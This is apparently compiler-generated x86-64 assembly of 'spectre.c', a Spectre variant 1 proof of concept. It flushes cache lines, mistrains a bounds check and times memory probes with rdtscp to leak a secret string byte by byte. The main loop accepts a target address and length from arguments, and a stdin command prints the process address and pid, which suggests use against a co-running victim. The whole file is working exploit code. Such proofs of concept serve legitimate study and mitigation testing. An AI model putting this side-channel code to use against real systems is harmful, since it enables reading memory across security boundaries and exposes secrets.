	.text
	.intel_syntax noprefix
	.file	"spectre.c"
	.globl	check                           # -- Begin function check
	.p2align	4, 0x90
	.type	check,@function
check:                                  # @check
	.cfi_startproc
# %bb.0:
	movsxd	rcx, dword ptr [rip + array1_size]
	xor	eax, eax
	cmp	rcx, rdi
	seta	al
	ret
.Lfunc_end0:
	.size	check, .Lfunc_end0-check
	.cfi_endproc
                                        # -- End function
	.globl	test                            # -- Begin function test
	.p2align	4, 0x90
	.type	test,@function
test:                                   # @test
	.cfi_startproc
# %bb.0:
	movsxd	rax, dword ptr [rip + array1_size]
	cmp	rax, rdi
	jbe	.LBB1_3
# %bb.1:
	lea	rax, [rip + array1]
	cmp	byte ptr [rdi + rax], sil
	jne	.LBB1_3
# %bb.2:
	movzx	eax, sil
	lea	rcx, [rip + array2]
	mov	al, byte ptr [rax + rcx]
	and	byte ptr [rip + temp], al
.LBB1_3:
	ret
.Lfunc_end1:
	.size	test, .Lfunc_end1-test
	.cfi_endproc
                                        # -- End function
	.globl	victim_function                 # -- Begin function victim_function
	.p2align	4, 0x90
	.type	victim_function,@function
victim_function:                        # @victim_function
	.cfi_startproc
# %bb.0:
	push	rax
	.cfi_def_cfa_offset 16
	movzx	esi, byte ptr [rip + check_value]
	call	test
	pop	rax
	.cfi_def_cfa_offset 8
	ret
.Lfunc_end2:
	.size	victim_function, .Lfunc_end2-victim_function
	.cfi_endproc
                                        # -- End function
	.globl	readMemoryByte                  # -- Begin function readMemoryByte
	.p2align	4, 0x90
	.type	readMemoryByte,@function
readMemoryByte:                         # @readMemoryByte
	.cfi_startproc
# %bb.0:
	push	rbp
	.cfi_def_cfa_offset 16
	push	r15
	.cfi_def_cfa_offset 24
	push	r14
	.cfi_def_cfa_offset 32
	push	r13
	.cfi_def_cfa_offset 40
	push	r12
	.cfi_def_cfa_offset 48
	push	rbx
	.cfi_def_cfa_offset 56
	sub	rsp, 40
	.cfi_def_cfa_offset 96
	.cfi_offset rbx, -56
	.cfi_offset r12, -48
	.cfi_offset r13, -40
	.cfi_offset r14, -32
	.cfi_offset r15, -24
	.cfi_offset rbp, -16
	mov	qword ptr [rsp + 16], rdx       # 8-byte Spill
	mov	qword ptr [rsp + 8], rsi        # 8-byte Spill
	mov	qword ptr [rsp + 24], rdi       # 8-byte Spill
	lea	rdi, [rip + readMemoryByte.results]
	mov	edx, 1024
	xor	esi, esi
	call	memset@PLT
	mov	eax, 999
	lea	r14, [rip + array2]
	mov	r15d, 2863311531
	.p2align	4, 0x90
.LBB3_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB3_2 Depth 2
                                        #     Child Loop BB3_4 Depth 2
                                        #       Child Loop BB3_5 Depth 3
                                        #         Child Loop BB3_22 Depth 4
                                        #     Child Loop BB3_11 Depth 2
	xor	ecx, ecx
	.p2align	4, 0x90
.LBB3_2:                                #   Parent Loop BB3_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	clflush	byte ptr [rcx + r14]
	add	rcx, 512
	cmp	rcx, 131072
	jne	.LBB3_2
# %bb.3:                                #   in Loop: Header=BB3_1 Depth=1
	mov	qword ptr [rsp + 32], rax       # 8-byte Spill
                                        # kill: def $eax killed $eax killed $rax
	cdq
	idiv	dword ptr [rip + array1_size]
	mov	r12d, edx
	mov	rbp, r12
	xor	rbp, qword ptr [rsp + 24]       # 8-byte Folded Reload
	xor	r13d, r13d
	jmp	.LBB3_4
	.p2align	4, 0x90
.LBB3_9:                                #   in Loop: Header=BB3_4 Depth=2
	add	r13, 1
	cmp	r13, 256
	je	.LBB3_10
.LBB3_4:                                #   Parent Loop BB3_1 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB3_5 Depth 3
                                        #         Child Loop BB3_22 Depth 4
	mov	byte ptr [rip + check_value], r13b
	mov	ebx, 29
	jmp	.LBB3_5
	.p2align	4, 0x90
.LBB3_6:                                #   in Loop: Header=BB3_5 Depth=3
	mov	eax, ebx
	imul	rax, r15
	shr	rax, 34
	add	eax, eax
	lea	eax, [rax + 2*rax]
	not	eax
	add	eax, ebx
	and	eax, -65536
	cdqe
	mov	rdi, rax
	shr	rdi, 16
	or	rdi, rax
	and	rdi, rbp
	xor	rdi, r12
	movzx	esi, byte ptr [rip + check_value]
	call	test
	sub	ebx, 1
	jb	.LBB3_7
.LBB3_5:                                #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_4 Depth=2
                                        # =>    This Loop Header: Depth=3
                                        #         Child Loop BB3_22 Depth 4
	clflush	byte ptr [rip + array1_size]
	mov	dword ptr [rsp + 4], 0
	mov	eax, dword ptr [rsp + 4]
	cmp	eax, 99
	jg	.LBB3_6
	.p2align	4, 0x90
.LBB3_22:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_4 Depth=2
                                        #       Parent Loop BB3_5 Depth=3
                                        # =>      This Inner Loop Header: Depth=4
	add	dword ptr [rsp + 4], 1
	mov	eax, dword ptr [rsp + 4]
	cmp	eax, 100
	jl	.LBB3_22
	jmp	.LBB3_6
	.p2align	4, 0x90
.LBB3_7:                                #   in Loop: Header=BB3_4 Depth=2
	rdtscp
	mov	rsi, rdx
	shl	rsi, 32
	or	rsi, rax
	mov	al, byte ptr [r13 + r14]
	rdtscp
	shl	rdx, 32
	or	rdx, rax
	sub	rdx, rsi
	cmp	rdx, 50
	ja	.LBB3_9
# %bb.8:                                #   in Loop: Header=BB3_4 Depth=2
	lea	rax, [rip + readMemoryByte.results]
	add	dword ptr [rax + 4*r13], 1
	jmp	.LBB3_9
	.p2align	4, 0x90
.LBB3_10:                               #   in Loop: Header=BB3_1 Depth=1
	mov	eax, -1
	lea	r8, [rip + readMemoryByte.results]
	mov	rdx, r8
	xor	esi, esi
	mov	edi, -1
	jmp	.LBB3_11
	.p2align	4, 0x90
.LBB3_12:                               #   in Loop: Header=BB3_11 Depth=2
	mov	edi, eax
	mov	eax, esi
.LBB3_17:                               #   in Loop: Header=BB3_11 Depth=2
	add	rsi, 1
	add	rdx, 4
	cmp	rsi, 256
	je	.LBB3_18
.LBB3_11:                               #   Parent Loop BB3_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	test	eax, eax
	js	.LBB3_12
# %bb.13:                               #   in Loop: Header=BB3_11 Depth=2
	mov	ebp, dword ptr [rdx]
	movsxd	rbx, eax
	cmp	ebp, dword ptr [r8 + 4*rbx]
	jge	.LBB3_12
# %bb.14:                               #   in Loop: Header=BB3_11 Depth=2
	test	edi, edi
	js	.LBB3_16
# %bb.15:                               #   in Loop: Header=BB3_11 Depth=2
	movsxd	rbx, edi
	cmp	ebp, dword ptr [r8 + 4*rbx]
	jl	.LBB3_17
.LBB3_16:                               #   in Loop: Header=BB3_11 Depth=2
	mov	edi, esi
	jmp	.LBB3_17
	.p2align	4, 0x90
.LBB3_18:                               #   in Loop: Header=BB3_1 Depth=1
	movsxd	rdx, eax
	mov	esi, dword ptr [r8 + 4*rdx]
	movsxd	rbx, edi
	mov	edi, dword ptr [r8 + 4*rbx]
	lea	ebp, [rdi + rdi]
	add	ebp, 5
	cmp	esi, ebp
	mov	rax, qword ptr [rsp + 32]       # 8-byte Reload
	jge	.LBB3_21
# %bb.19:                               #   in Loop: Header=BB3_1 Depth=1
	xor	esi, 2
	or	esi, edi
	je	.LBB3_21
# %bb.20:                               #   in Loop: Header=BB3_1 Depth=1
	lea	esi, [rax - 1]
	cmp	eax, 1
	mov	eax, esi
	ja	.LBB3_1
.LBB3_21:
	xor	dword ptr [rip + readMemoryByte.results], ecx
	lea	rcx, [rip + readMemoryByte.results]
	mov	rdi, qword ptr [rsp + 8]        # 8-byte Reload
	mov	byte ptr [rdi], dl
	mov	edx, dword ptr [rcx + 4*rdx]
	mov	rsi, qword ptr [rsp + 16]       # 8-byte Reload
	mov	dword ptr [rsi], edx
	mov	byte ptr [rdi + 1], bl
	mov	eax, dword ptr [rcx + 4*rbx]
	mov	dword ptr [rsi + 4], eax
	add	rsp, 40
	.cfi_def_cfa_offset 56
	pop	rbx
	.cfi_def_cfa_offset 48
	pop	r12
	.cfi_def_cfa_offset 40
	pop	r13
	.cfi_def_cfa_offset 32
	pop	r14
	.cfi_def_cfa_offset 24
	pop	r15
	.cfi_def_cfa_offset 16
	pop	rbp
	.cfi_def_cfa_offset 8
	ret
.Lfunc_end3:
	.size	readMemoryByte, .Lfunc_end3-readMemoryByte
	.cfi_endproc
                                        # -- End function
	.globl	main                            # -- Begin function main
	.p2align	4, 0x90
	.type	main,@function
main:                                   # @main
	.cfi_startproc
# %bb.0:
	push	rbp
	.cfi_def_cfa_offset 16
	push	r15
	.cfi_def_cfa_offset 24
	push	r14
	.cfi_def_cfa_offset 32
	push	r13
	.cfi_def_cfa_offset 40
	push	r12
	.cfi_def_cfa_offset 48
	push	rbx
	.cfi_def_cfa_offset 56
	sub	rsp, 40
	.cfi_def_cfa_offset 96
	.cfi_offset rbx, -56
	.cfi_offset r12, -48
	.cfi_offset r13, -40
	.cfi_offset r14, -32
	.cfi_offset r15, -24
	.cfi_offset rbp, -16
	mov	qword ptr [rsp + 32], rsi       # 8-byte Spill
	mov	dword ptr [rsp + 20], edi       # 4-byte Spill
	mov	rbp, qword ptr [rip + stdin@GOTPCREL]
	lea	r12, [rip + .L.str.8]
	lea	r14, [rip + .L.str.7]
	lea	rbx, [rip + .L.str.10]
	jmp	.LBB4_1
	.p2align	4, 0x90
.LBB4_12:                               #   in Loop: Header=BB4_1 Depth=1
	xor	eax, eax
	call	getpid@PLT
	lea	rdi, [rip + .L.str.13]
	lea	rsi, [rip + check+33]
	mov	edx, eax
	xor	eax, eax
	call	printf@PLT
.LBB4_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB4_8 Depth 2
	mov	rdi, qword ptr [rbp]
	call	getc@PLT
	shl	eax, 24
	cmp	eax, 167772160
	je	.LBB4_1
# %bb.2:                                #   in Loop: Header=BB4_1 Depth=1
	cmp	eax, 1761607680
	je	.LBB4_12
# %bb.3:                                #   in Loop: Header=BB4_1 Depth=1
	cmp	eax, 1912602624
	jne	.LBB4_13
# %bb.4:                                #   in Loop: Header=BB4_1 Depth=1
	mov	rdx, qword ptr [rip + secret]
	lea	rdi, [rip + .L.str.1]
	mov	rsi, rdx
	xor	eax, eax
	call	printf@PLT
	mov	rdi, qword ptr [rip + secret]
	mov	rax, rdi
	lea	rcx, [rip + array1]
	sub	rax, rcx
	mov	qword ptr [rsp + 8], rax
	call	strlen@PLT
	mov	dword ptr [rsp], eax
	mov	byte ptr [rip + check_value], 1
	mov	edx, 131072
	lea	rdi, [rip + array2]
	mov	esi, 1
	call	memset@PLT
	cmp	dword ptr [rsp + 20], 3         # 4-byte Folded Reload
	jne	.LBB4_6
# %bb.5:                                #   in Loop: Header=BB4_1 Depth=1
	mov	rbp, qword ptr [rsp + 32]       # 8-byte Reload
	mov	rdi, qword ptr [rbp + 8]
	lea	rsi, [rip + .L.str.2]
	lea	rdx, [rsp + 8]
	xor	eax, eax
	call	__isoc99_sscanf@PLT
	lea	rax, [rip + array1]
	sub	qword ptr [rsp + 8], rax
	mov	rdi, qword ptr [rbp + 16]
	lea	rsi, [rip + .L.str.3]
	mov	rdx, rsp
	xor	eax, eax
	call	__isoc99_sscanf@PLT
	mov	rsi, qword ptr [rsp + 8]
	mov	edx, dword ptr [rsp]
	lea	rdi, [rip + .L.str.4]
	xor	eax, eax
	call	printf@PLT
.LBB4_6:                                #   in Loop: Header=BB4_1 Depth=1
	mov	esi, dword ptr [rsp]
	lea	rdi, [rip + .L.str.5]
	xor	eax, eax
	call	printf@PLT
	mov	eax, dword ptr [rsp]
	lea	ecx, [rax - 1]
	mov	dword ptr [rsp], ecx
	test	eax, eax
	jle	.LBB4_11
# %bb.7:                                #   in Loop: Header=BB4_1 Depth=1
	xor	r13d, r13d
	jmp	.LBB4_8
	.p2align	4, 0x90
.LBB4_10:                               #   in Loop: Header=BB4_8 Depth=2
	mov	edi, 10
	call	putchar@PLT
	mov	eax, dword ptr [rsp]
	lea	ecx, [rax - 1]
	mov	dword ptr [rsp], ecx
	add	r13, 1
	test	eax, eax
	jle	.LBB4_11
.LBB4_8:                                #   Parent Loop BB4_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	mov	rsi, qword ptr [rsp + 8]
	mov	rax, qword ptr [rip + secret]
	movsx	edx, byte ptr [rax + r13]
	lea	rdi, [rip + .L.str.6]
	xor	eax, eax
	call	printf@PLT
	mov	rdi, qword ptr [rsp + 8]
	lea	rax, [rdi + 1]
	mov	qword ptr [rsp + 8], rax
	lea	rsi, [rsp + 6]
	lea	rdx, [rsp + 24]
	call	readMemoryByte
	mov	r15d, dword ptr [rsp + 24]
	mov	ebp, dword ptr [rsp + 28]
	lea	eax, [rbp + rbp]
	cmp	r15d, eax
	mov	rsi, r12
	lea	rax, [rip + .L.str.9]
	cmovl	rsi, rax
	mov	rdi, r14
	xor	eax, eax
	call	printf@PLT
	movzx	esi, byte ptr [rsp + 6]
	lea	eax, [rsi - 32]
	cmp	al, 95
	mov	edx, 63
	cmovb	edx, esi
	mov	rdi, rbx
                                        # kill: def $esi killed $esi killed $rsi
	mov	ecx, r15d
	xor	eax, eax
	call	printf@PLT
	test	ebp, ebp
	jle	.LBB4_10
# %bb.9:                                #   in Loop: Header=BB4_8 Depth=2
	movzx	esi, byte ptr [rsp + 7]
	lea	eax, [rsi - 32]
	cmp	al, 95
	mov	edx, 63
	cmovb	edx, esi
	lea	rdi, [rip + .L.str.11]
                                        # kill: def $esi killed $esi killed $rsi
	mov	ecx, ebp
	xor	eax, eax
	call	printf@PLT
	jmp	.LBB4_10
	.p2align	4, 0x90
.LBB4_11:                               #   in Loop: Header=BB4_1 Depth=1
	mov	rbp, qword ptr [rip + stdin@GOTPCREL]
	jmp	.LBB4_1
.LBB4_13:
	xor	eax, eax
	add	rsp, 40
	.cfi_def_cfa_offset 56
	pop	rbx
	.cfi_def_cfa_offset 48
	pop	r12
	.cfi_def_cfa_offset 40
	pop	r13
	.cfi_def_cfa_offset 32
	pop	r14
	.cfi_def_cfa_offset 24
	pop	r15
	.cfi_def_cfa_offset 16
	pop	rbp
	.cfi_def_cfa_offset 8
	ret
.Lfunc_end4:
	.size	main, .Lfunc_end4-main
	.cfi_endproc
                                        # -- End function
	.type	array1_size,@object             # @array1_size
	.data
	.globl	array1_size
	.p2align	2
array1_size:
	.long	16                              # 0x10
	.size	array1_size, 4

	.type	array1,@object                  # @array1
	.globl	array1
	.p2align	4
array1:
	.ascii	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	144
	.size	array1, 160

	.type	.L.str,@object                  # @.str
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str:
	.asciz	"The Magic Words are Squeamish Ossifrage."
	.size	.L.str, 41

	.type	secret,@object                  # @secret
	.data
	.globl	secret
	.p2align	3
secret:
	.quad	.L.str
	.size	secret, 8

	.type	temp,@object                    # @temp
	.bss
	.globl	temp
temp:
	.byte	0                               # 0x0
	.size	temp, 1

	.type	check_value,@object             # @check_value
	.data
	.globl	check_value
check_value:
	.byte	1                               # 0x1
	.size	check_value, 1

	.type	array2,@object                  # @array2
	.bss
	.globl	array2
	.p2align	4
array2:
	.zero	131072
	.size	array2, 131072

	.type	readMemoryByte.results,@object  # @readMemoryByte.results
	.local	readMemoryByte.results
	.comm	readMemoryByte.results,1024,16
	.type	.L.str.1,@object                # @.str.1
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str.1:
	.asciz	"Putting '%s' in memory, address %p\n"
	.size	.L.str.1, 36

	.type	.L.str.2,@object                # @.str.2
.L.str.2:
	.asciz	"%p"
	.size	.L.str.2, 3

	.type	.L.str.3,@object                # @.str.3
.L.str.3:
	.asciz	"%d"
	.size	.L.str.3, 3

	.type	.L.str.4,@object                # @.str.4
.L.str.4:
	.asciz	"Trying malicious_x = %p, len = %d\n"
	.size	.L.str.4, 35

	.type	.L.str.5,@object                # @.str.5
.L.str.5:
	.asciz	"Reading %d bytes:\n"
	.size	.L.str.5, 19

	.type	.L.str.6,@object                # @.str.6
.L.str.6:
	.asciz	"Reading at malicious_x = %p secc= %c ..."
	.size	.L.str.6, 41

	.type	.L.str.7,@object                # @.str.7
.L.str.7:
	.asciz	"%s: "
	.size	.L.str.7, 5

	.type	.L.str.8,@object                # @.str.8
.L.str.8:
	.asciz	"Success"
	.size	.L.str.8, 8

	.type	.L.str.9,@object                # @.str.9
.L.str.9:
	.asciz	"Unclear"
	.size	.L.str.9, 8

	.type	.L.str.10,@object               # @.str.10
.L.str.10:
	.asciz	"0x%02X='%c' score=%d "
	.size	.L.str.10, 22

	.type	.L.str.11,@object               # @.str.11
.L.str.11:
	.asciz	"(second best: 0x%02X='%c' score=%d)"
	.size	.L.str.11, 36

	.type	.L.str.13,@object               # @.str.13
.L.str.13:
	.asciz	"addr = %llx, pid = %d\n"
	.size	.L.str.13, 23

	.type	unused1,@object                 # @unused1
	.bss
	.globl	unused1
	.p2align	4
unused1:
	.zero	64
	.size	unused1, 64

	.type	unused2,@object                 # @unused2
	.globl	unused2
	.p2align	4
unused2:
	.zero	64
	.size	unused2, 64

	.ident	"Ubuntu clang version 14.0.0-1ubuntu1.1"
	.section	".note.GNU-stack","",@progbits
	.addrsig
	.addrsig_sym check
	.addrsig_sym array1_size
	.addrsig_sym array1
	.addrsig_sym array2
